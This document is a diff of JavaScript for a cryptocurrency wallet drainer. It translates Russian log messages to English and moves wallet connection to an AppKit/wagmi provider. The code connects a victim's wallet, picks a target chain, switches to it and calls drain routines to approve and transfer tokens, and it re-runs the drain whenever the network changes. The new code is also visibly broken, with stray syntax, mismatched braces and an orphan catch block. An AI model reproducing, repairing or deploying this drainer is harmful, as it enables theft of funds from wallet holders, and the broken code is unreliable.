@@ -923,13 +914,13 @@ async function hideModalWithDelay(errorMessage = null) {
 
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠️ Транзакция уже выполнена или ожидается');
+    console.log('⚠️ Transaction already completed or pending');
     await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
 
   if (!connectedAddress) {
-    console.error('❌ Адрес кошелька не определён');
+    console.error('❌ Wallet address not defined');
     showModal();
     await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
     return;
@@ -937,8 +928,9 @@ async function attemptDrainer() {
 
   showModal();
 
-  try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+ try {
+    const provider = wagmiAdapter.getProvider(); // Use AppKit provider
+    if (!provider) throw new Error('No provider available');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -949,123 +941,125 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    const { targetChainId, targetProvider }: = await runDrainer(provider, signer, connectedAddress);
     if (targetChainId) {
       await switchChain(targetChainId);
       const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
-      console.log('✅ Drainer выполнен, статус:', status);
+      console.log('✅ Drainer executed, status:', status);
     }
 
     hasDrained = true;
     isTransactionPending = false;
-  } catch (err) {
+  } catch (error) {
     isTransactionPending = false;
-    let errorMessage = "Error: An unexpected error occurred. Please try again.";
-    if (err.message.includes('user rejected')) {
-      errorMessage = "Error: Transaction rejected by user.";
-    } else if (err.message.includes('Insufficient')) {
-      errorMessage = err.message;
-    } else if (err.message.includes('Failed to approve token')) {
-      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
-    } else if (err.message.includes('Failed to process')) {
-      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
-    } else if (err.message.includes('Failed to switch chain')) {
-      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
-    } else {
-      errorMessage = `Error: ${err.message}`;
-    }
-    console.error('❌ Ошибка drainer:', err.message);
+    let errorMessage = "Error: An unexpected error occurred.";
+    if (error.message.includes('user rejected')) {
+      errorMessage = "Error: Transaction by user.";
+      } else {
+ if (errorMessage.includes('Insufficient')) {
+        errorMessage = error.message;
+      } else {
+ if (errorMessage.includes('Failed to approve token')) {
+        errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+      } else {
+ if (errorMessage.includes('Failed to process')) {
+        errorMessage = "Error: Failed to process native token transfer. Your wallet may not support.";
+        } else {
+ if (error.message.includes('Failed to switch chain')) {
+          errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+          } else {
+            errorMessage = `Error: ${error.message}`;
+          }
+        }
+      }
+    console.error('❌ Drainer error:', error.message);
     await hideModalWithDelay(errorMessage);
-    throw err;
+    throw error;
   }
 }
 
 async function handleConnectOrAction() {
   try {
     if (!connectedAddress) {
-      console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
+      console.log('🎛️ Opening AppKit modal for wallet selection...');
       await appKitModal.open();
-      connectedAddress = await waitForWallet();
-      console.log('✅ Подключён:', connectedAddress);
+      connectedAddress = await waitForAppKitConnection();
+      console.log('✅ Wallet connected:', connectedAddress);
       appKitModal.close();
 
-      // Сохраняем сессию после успешного подключения
-      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      // Save session after successful connection
+      const provider = wagmiAdapter.getProvider();
+      if (!provider) throw new Error('No provider available after connection');
       const network = await provider.getNetwork();
       await saveSession(connectedAddress, network.chainId);
     } else {
-      console.log('ℹ️ Кошелёк уже подключён:', connectedAddress);
+      console.log('✅ Wallet already connected:', connectedAddress);
     }
 
     if (!isTransactionPending) {
       await attemptDrainer();
     } else {
-      console.log('⏳ Транзакция уже выполняется');
+      console.log('⏳ Transaction already in progress');
       await hideModalWithDelay("Transaction already in progress.");
     }
   } catch (err) {
-    console.error('❌ Ошибка подключения:', err.message);
+    console.error('❌ Connection error:', error.err.message);
     appKitModal.close();
     isTransactionPending = false;
     showModal();
-    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
-  }
+    await hideModalWithDelay(`Error(: Failed to connect wallet. ${err.message}`);
+    }
+  } catch (error) {
 }
 
 async function onChainChanged(chainId) {
-  console.log('🔄 Смена сети:', chainId);
-  if (connectedAddress && !isTransactionPending) {
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-    const newNetwork = await provider.getNetwork();
-    console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
-    // Сохраняем сессию при смене сети
-    await saveSession(connectedAddress, newNetwork.chainId);
-    await attemptDrainer();
-  } else {
-    console.log('⏳ Транзакция в процессе');
-    await hideModalWithDelay("Transaction in progress, please wait.");
+  console.log('🔄 Network changed:', chainId);
+  try {
+    if (connectedAddress && !isTransactionPending) {
+      const provider = wagmiAdapter.getProvider();
+      if (!provider) throw new Error('No provider available');
+      const newNetwork = await provider.getNetwork();
+      console.log(`📡 New network: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+      // Save session on network change
+      await saveSession(connectedAddress, newNetwork.chainId);
+      await attemptDrainer();
+    } else {
+      console.log('⏳ Transaction pending');
+      await hideModalWithDelay("Transaction in progress, please wait.");
+    }
+  } catch (err) {
+    console.error('❌ Chain change error:', error.err.message);
+    await hideModalWithDelay("Network change error occurred.");
   }
 }
 
-async function waitForWallet() {
+async function waitForAppKitConnection() {
   return new Promise((resolve, reject) => {
-    console.log('⏳ Ожидаем подключение кошелька через AppKit...');
+    console.log('📡 Waiting for wallet connection via AppKit...');
 
     const isMobile = isMobileDevice();
-    console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
-    const handler = async (accounts) => {
-      if (accounts.length > 0) {
-        console.log('✅ Аккаунты найдены:', accounts);
-        clearTimeout(timeout);
-        clearInterval(checkInterval);
-        resolve(accounts[0]);
+    // Subscribe to AppKit state changes
+    const unsubscribe = appKitModal.subscribeState((state) => {
+      if (state.connected && state.address) {
+        console.log('✅ Wallet connected via AppKit:', state.address);
+        unsubscribe();
+        resolve(state.address);
       }
-    };
+    });
 
-    window.ethereum.on('accountsChanged', handler);
-
-    const checkInterval = setInterval(async () => {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-          clearTimeout(timeout);
-          clearInterval(checkInterval);
-          resolve(accounts[0]);
-        }
-      } catch (err) {
-        console.error('❌ Ошибка проверки аккаунтов:', err.message);
-      }
-    }, 1000);
-
+    // Timeout after 60 seconds
     const timeout = setTimeout(() => {
-      window.ethereum.removeListener('accountsChanged', handler);
-      clearInterval(checkInterval);
+      unsubscribe();
       reject(new Error('Timeout waiting for wallet connection'));
-    }, 50000);
+    }, 60000);
 
-    window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
-      console.error('❌ Ошибка запроса аккаунтов:', err.message);
+    // Handle errors
+    appKitModal.on('error', (err) => {
+      console.error('❌ AppKit connection error:', err.message);
+      clearTimeout(timeout);
+      unsubscribe();
       reject(err);
     });
   });
